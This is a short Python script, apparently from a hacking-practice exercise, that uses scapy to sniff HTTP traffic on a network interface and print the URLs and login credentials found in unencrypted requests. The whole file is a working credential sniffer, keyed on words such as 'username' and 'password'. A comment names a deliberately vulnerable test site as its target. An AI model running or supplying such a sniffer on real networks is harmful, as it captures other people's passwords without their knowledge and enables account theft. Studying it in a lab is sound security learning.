import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet) #can usef filter argument to filter specific ports

def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
           
            keywords = ["username","name","uname","password","pass"] 
    
            for keyword in keywords:

                if keyword in load:
                    return load                  
                

def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url=get_url(packet)
        login_info=get_login_info(packet)
        print("[+] HTTP Request >> ",url)

        if login_info :
             print("\n\n[+] Uername and password >> "+login_info+"\n\n")
        

       

sniff("eth0")










# http://testphp.vulnweb.com/login.php
